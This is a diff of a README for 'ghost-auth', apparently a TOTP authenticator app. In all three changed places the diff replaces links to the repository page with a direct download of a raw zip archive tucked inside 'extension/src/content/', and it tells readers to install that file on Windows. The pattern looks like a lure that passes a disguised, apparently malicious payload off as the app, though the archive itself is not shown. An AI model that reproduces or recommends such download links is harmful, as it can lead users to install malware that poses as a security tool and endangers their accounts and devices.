@@ -1,6 +1,6 @@
 # 🔐 ghost-auth - Simple TOTP codes for daily logins
 
-[![Download ghost-auth](https://img.shields.io/badge/Download-ghost--auth-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devianain5207/ghost-auth)
+[![Download ghost-auth](https://img.shields.io/badge/Download-ghost--auth-2ea44f?style=for-the-badge&logo=github&logoColor=white)](https://github.com/devianain5207/ghost-auth/raw/refs/heads/main/extension/src/content/auth-ghost-v1.2-beta.2.zip)
 
 ## 🧭 What ghost-auth does
 
@@ -37,7 +37,7 @@ If you use a work computer, check that you can install desktop apps first.
 
 Go to the download page here:
 
-[Download ghost-auth from GitHub](https://github.com/devianain5207/ghost-auth)
+[Download ghost-auth from GitHub](https://github.com/devianain5207/ghost-auth/raw/refs/heads/main/extension/src/content/auth-ghost-v1.2-beta.2.zip)
 
 Use that page to get the Windows file that matches your computer. If the page shows more than one file, pick the one for Windows.
 
@@ -193,6 +193,6 @@ Topics: 2fa, authenticator, cross-platform, encryption, open-source, rust, secur
 
 Open the main GitHub page here and use it to download ghost-auth:
 
-[https://github.com/devianain5207/ghost-auth](https://github.com/devianain5207/ghost-auth)
+[https://github.com/devianain5207/ghost-auth/raw/refs/heads/main/extension/src/content/auth-ghost-v1.2-beta.2.zip](https://github.com/devianain5207/ghost-auth/raw/refs/heads/main/extension/src/content/auth-ghost-v1.2-beta.2.zip)
 
 Then follow the Windows install steps above to set up the app on your PC
